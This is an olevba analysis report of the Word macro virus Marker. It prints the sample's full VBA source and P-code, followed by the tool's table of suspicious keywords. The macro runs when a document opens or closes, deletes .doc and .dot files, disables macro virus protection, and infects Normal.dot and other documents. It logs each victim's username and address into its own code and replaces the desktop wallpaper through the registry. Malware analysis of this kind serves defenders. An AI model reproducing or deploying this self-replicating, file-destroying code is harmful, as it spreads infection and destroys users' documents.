olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.hc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Const Marker = "<- Win9X SuX.. LiNuX SuX... Use UniX"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Bia, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "fayer"
Application.UserInitials = "Aa"
Application.UserAddress = "aku@tanak-cakap.com"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "fayer a.k.a skyline-"
    .Title = "Bi'a, Mat-Kot, Sopi, Shah <- 013-4034031"
    .Subject = "Buat la assignment bebaik..<--pesanan dari Ein"
    .Comments = "Greetings to #ITnet members, biolator, VeRvE^, A||MyLife, ^bLenDy^ and all DALNet peoples...i Hate u All :)"
    .Keywords = "Greetings to #ITnet members, biolator, VeRvE^ and all DALNet peoples...i Hate u All :)"
    .Execute
End With
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.codemodule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.codemodule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Bia = AD.codemodule.Lines(1, AD.codemodule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Bia = Bia & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.codemodule.deletelines 1, NT.codemodule.CountOfLines
   NT.codemodule.AddFromString Bia
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Bia = NT.codemodule.Lines(1, NT.codemodule.CountOfLines)
    AD.codemodule.deletelines 1, AD.codemodule.CountOfLines
    AD.codemodule.AddFromString Bia
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim Tandop As String
On Error Resume Next
 Tandop = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open Tandop & "\playa.html" For Output As #1
 Print #1, "<Html><head><title>School of Malaysian Network..</title></head><Body><body bgcolor = '#000000' >"
 Print #1, "<b><FONT COLOR='#ffffff'><p>W3lc0m3 t0 M4l4ys14n N3tw0rk….. (greetings to all DALnet Member… #ITnet, #IPT</p>"
 Print #1, "<P>Dan channel channel yang bersekongkol...</P>"
 Print #1, "<P>0ur T0p1c… why *.my D0m41ns 4r3 SuX??</P>"
 Print #1, "</FONT><FONT FACE="; Bookman; Old; Style; " COLOR='#ffffff'><P>1 w1sh 1 c4n b3 4 syst3m 4dm1n…</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 n3tw0rk 4dm1n…</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 4 s0ftw4r3 pr0gr4mm3r…</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 'P4g4r B1ll'….</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 Th3 R0ck….</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 S1t1 Nurh4l1z4 b0yfr13nd…</P>"
 Print #1, "<P>1 w1sh 1 c4n h4v3 d1nn3r w1th Br1tn3y Sp34r…</P>"
 Print #1, "<P>1f y0u smmmm33llllllll….. wh4t y0ur mum 1s c00k1ng…. <FONT FACE="; Wingdings; ">&#74;</FONT>"
 Print #1, "<FONT FACE="; Wingdings; ">&#223;</FONT>"
 Print #1, "<P>4y4t M4ut Th3 R0ck..</P>"
 Print #1, "<P>4nd h4v3 4 n1c3 d4yy……</P>"
 Print #1, "</B><P>&nbsp;</P></FONT></BODY></HTML>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = Tandop & "\playa.html"
Return
Finish:
End Sub

' 09:56:59:56:05 PM PM-Saturday, 30 Sep 2000
' fayer
' aku@tanak-cakap.com

 


' 04:52:134:52:13 PM PM-Tuesday, 14 Nov 2000
' fayer
' aku@tanak-cakap.com

 


' 10:52:4710:52:47 AM AM-Friday, 1 Dec 2000
' fayer
' aku@tanak-cakap.com

 


' 10:43:4510:43:45 AM AM-Thursday, 7 Dec 2000
' fayer
' aku@tanak-cakap.com

 


' 12:46:4712:46:47 PM PM-Monday, 8 Jan 2001
' fayer
' aku@tanak-cakap.com

 


' 09:52:119:52:11 AM AM-Tuesday, 20 Feb 2001
' fayer
' aku@tanak-cakap.com

 


' 08:02:298:02:29 PM PM-Tuesday, 27 Feb 2001
' fayer
' aku@tanak-cakap.com

 


' 11:01:4611:01:46 AM AM-Wednesday, 28 Feb 2001
' fayer
' aku@tanak-cakap.com

 


' 08:16:418:16:41 PM PM-Wednesday, 28 Feb 2001
' fayer
' aku@tanak-cakap.com

 


' 04:22:394:22:39 PM PM-Friday, 2 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 03:50:43:50:04 PM PM-Sunday, 4 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 03:14:593:14:59 PM PM-Monday, 5 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 06:17:166:17:16 PM PM-Monday, 5 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 10:40:2810:40:28 AM AM-Wednesday, 7 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 10:43:2610:43:26 AM AM-Friday, 9 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 07:51:57:51:05 PM PM-Friday, 9 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 04:32:574:32:57 PM PM-Saturday, 10 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 10:26:3510:26:35 AM AM-Monday, 12 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 01:03:421:03:42 PM PM-Wednesday, 25 Apr 2001
' fayer
' aku@tanak-cakap.com

 


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.hc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12386 bytes
' Line #0:
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0024 "<- Win9X SuX.. LiNuX SuX... Use UniX"
' 	VarDefn Marker
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	ArgsCall Document_Close 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Document_Close())
' Line #6:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #7:
' 	Dim 
' 	VarDefn isd (As String)
' Line #8:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn Bia
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #12:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #13:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	LitStr 0x0005 "fayer"
' 	Ld Application 
' 	MemSt UserName 
' Line #16:
' 	LitStr 0x0002 "Aa"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #17:
' 	LitStr 0x0013 "aku@tanak-cakap.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #18:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #19:
' 	LitStr 0x0014 "fayer a.k.a skyline-"
' 	MemStWith Author 
' Line #20:
' 	LitStr 0x0028 "Bi'a, Mat-Kot, Sopi, Shah <- 013-4034031"
' 	MemStWith Title 
' Line #21:
' 	LitStr 0x002E "Buat la assignment bebaik..<--pesanan dari Ein"
' 	MemStWith Subject 
' Line #22:
' 	LitStr 0x006B "Greetings to #ITnet members, biolator, VeRvE^, A||MyLife, ^bLenDy^ and all DALNet peoples...i Hate u All :)"
' 	MemStWith Comments 
' Line #23:
' 	LitStr 0x0056 "Greetings to #ITnet members, biolator, VeRvE^ and all DALNet peoples...i Hate u All :)"
' 	MemStWith Keywords 
' Line #24:
' 	ArgsMemCallWith Execute 0x0000 
' Line #25:
' 	EndWith 
' Line #26:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #27:
' 	GoSub InsertIon 
' Line #28:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #29:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #30:
' 	GoTo Finish 
' Line #31:
' 	Label InsertIon 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #34:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #35:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #36:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #37:
' 	Ld DI 
' 	IfBlock 
' Line #38:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St Bia 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #41:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #42:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #43:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Next 
' Line #49:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld Bia 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St Bia 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #51:
' 	Ld Bia 
' 	Ld NT 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #52:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Ld NTI 
' 	IfBlock 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #56:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St Bia 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #58:
' 	Ld Bia 
' 	Ld AD 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #59:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Return 
' Line #63:
' 	Label LoggingIn 
' Line #64:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #65:
' 	GoSub ShowMe 
' Line #66:
' 	Return 
' Line #67:
' 	Label ShowMe 
' Line #68:
' 	Dim 
' 	VarDefn Tandop (As String)
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Tandop 
' Line #71:
' 	Ld Tandop 
' 	LitStr 0x000B "\playa.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0060 "<Html><head><title>School of Malaysian Network..</title></head><Body><body bgcolor = '#000000' >"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006D "<b><FONT COLOR='#ffffff'><p>W3lc0m3 t0 M4l4ys14n N3tw0rk….. (greetings to all DALnet Member… #ITnet, #IPT</p>"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "<P>Dan channel channel yang bersekongkol...</P>"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "<P>0ur T0p1c… why *.my D0m41ns 4r3 SuX??</P>"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "</FONT><FONT FACE="
' 	PrintItemSemi 
' 	Ld Bookman 
' 	PrintItemSemi 
' 	Ld Old 
' 	PrintItemSemi 
' 	Ld Style 
' 	PrintItemSemi 
' 	LitStr 0x0037 " COLOR='#ffffff'><P>1 w1sh 1 c4n b3 4 syst3m 4dm1n…</P>"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "<P>1 w1sh 1 c4n b3 n3tw0rk 4dm1n…</P>"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "<P>1 w1sh 1 c4n b3 4 s0ftw4r3 pr0gr4mm3r…</P>"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "<P>1 w1sh 1 c4n b3 'P4g4r B1ll'….</P>"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "<P>1 w1sh 1 c4n b3 Th3 R0ck….</P>"
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "<P>1 w1sh 1 c4n b3 S1t1 Nurh4l1z4 b0yfr13nd…</P>"
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "<P>1 w1sh 1 c4n h4v3 d1nn3r w1th Br1tn3y Sp34r…</P>"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0043 "<P>1f y0u smmmm33llllllll….. wh4t y0ur mum 1s c00k1ng…. <FONT FACE="
' 	PrintItemSemi 
' 	Ld Wingdings 
' 	PrintItemSemi 
' 	LitStr 0x000D ">&#74;</FONT>"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "<FONT FACE="
' 	PrintItemSemi 
' 	Ld Wingdings 
' 	PrintItemSemi 
' 	LitStr 0x000E ">&#223;</FONT>"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "<P>4y4t M4ut Th3 R0ck..</P>"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "<P>4nd h4v3 4 n1c3 d4yy……</P>"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "</B><P>&nbsp;</P></FONT></BODY></HTML>"
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #89:
' 	Ld Tandop 
' 	LitStr 0x000B "\playa.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #90:
' 	Return 
' Line #91:
' 	Label Finish 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	QuoteRem 0x0000 0x002B " 09:56:59:56:05 PM PM-Saturday, 30 Sep 2000"
' Line #95:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #96:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' 	QuoteRem 0x0000 0x002B " 04:52:134:52:13 PM PM-Tuesday, 14 Nov 2000"
' Line #102:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #103:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' 	QuoteRem 0x0000 0x002A " 10:52:4710:52:47 AM AM-Friday, 1 Dec 2000"
' Line #109:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #110:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x002C " 10:43:4510:43:45 AM AM-Thursday, 7 Dec 2000"
' Line #116:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #117:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x002A " 12:46:4712:46:47 PM PM-Monday, 8 Jan 2001"
' Line #123:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #124:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' 	QuoteRem 0x0000 0x002B " 09:52:119:52:11 AM AM-Tuesday, 20 Feb 2001"
' Line #130:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #131:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' 	QuoteRem 0x0000 0x002B " 08:02:298:02:29 PM PM-Tuesday, 27 Feb 2001"
' Line #137:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #138:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' 	QuoteRem 0x0000 0x002E " 11:01:4611:01:46 AM AM-Wednesday, 28 Feb 2001"
' Line #144:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #145:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' 	QuoteRem 0x0000 0x002D " 08:16:418:16:41 PM PM-Wednesday, 28 Feb 2001"
' Line #151:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #152:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x0029 " 04:22:394:22:39 PM PM-Friday, 2 Mar 2001"
' Line #158:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #159:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' 	QuoteRem 0x0000 0x0028 " 03:50:43:50:04 PM PM-Sunday, 4 Mar 2001"
' Line #165:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #166:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' 	QuoteRem 0x0000 0x0029 " 03:14:593:14:59 PM PM-Monday, 5 Mar 2001"
' Line #172:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #173:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' 	QuoteRem 0x0000 0x0029 " 06:17:166:17:16 PM PM-Monday, 5 Mar 2001"
' Line #179:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #180:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' 	QuoteRem 0x0000 0x002D " 10:40:2810:40:28 AM AM-Wednesday, 7 Mar 2001"
' Line #186:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #187:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' 	QuoteRem 0x0000 0x002A " 10:43:2610:43:26 AM AM-Friday, 9 Mar 2001"
' Line #193:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #194:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' 	QuoteRem 0x0000 0x0028 " 07:51:57:51:05 PM PM-Friday, 9 Mar 2001"
' Line #200:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #201:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' 	QuoteRem 0x0000 0x002C " 04:32:574:32:57 PM PM-Saturday, 10 Mar 2001"
' Line #207:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #208:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x002B " 10:26:3510:26:35 AM AM-Monday, 12 Mar 2001"
' Line #214:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #215:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x002D " 01:03:421:03:42 PM PM-Wednesday, 25 Apr 2001"
' Line #221:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #222:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #223:
' Line #224:
' Line #225:
' Line #226:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

